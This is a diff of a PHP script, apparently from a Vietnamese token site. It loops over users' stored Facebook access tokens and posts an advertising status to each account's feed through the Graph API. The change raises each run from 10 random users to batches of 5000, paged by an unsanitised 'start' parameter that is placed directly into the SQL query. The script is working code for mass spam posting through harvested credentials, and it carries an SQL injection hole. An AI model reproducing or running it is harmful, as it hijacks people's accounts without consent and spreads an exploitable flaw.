@@ -1,8 +1,15 @@
 <?php
 set_time_limit(0);
 require("../databasecsdl.php");
-$getinfo = @mysqli_query($connection,"SELECT * FROM `Users` ORDER BY RAND() LIMIT 0,10");
-$star = 0;
+$items = @mysqli_query($connection,"SELECT * FROM Users");
+$thispage = $PHP_SELF;
+$num = @mysqli_num_rows($items);
+$per_page = 5000;
+$start = @$_GET['start'];
+if(empty($start)) $start = 0;
+if($start+$per_page<$num){
+}
+$getinfo = @mysqli_query($connection,"SELECT * FROM `Users` ORDER BY id LIMIT $start,$per_page");
 while ($gettoken = @mysqli_fetch_array($getinfo)){
 $token= $gettoken['token2'];
 $name= $gettoken['name'];
@@ -25,8 +32,8 @@ Cảm ơn bạn đã sử dụng Website của mình.
 Mạn phép cho mình xin 1 status quảng cáo nhé.
 🚹=========🚺🚺=========🚹';
 auto('https://graph.facebook.com/me/feed?access_token='.$token.'&message='.urlencode($msg).'&method=post');
-echo '<span style="color:red">Đã upstt cho nick: </span><span style="color:#0E0101">'.$name.'</span> <hr/><span style="color:green"> [SUCCESS]</span><hr/>';
 }
+echo '<span style="color:red">Đã upstt cho nick: </span><span style="color:#0E0101">'.$name.'</span> <hr/><span style="color:green"> [SUCCESS]</span><hr/>';
 
 function auto($url) {
    $ch = curl_init();
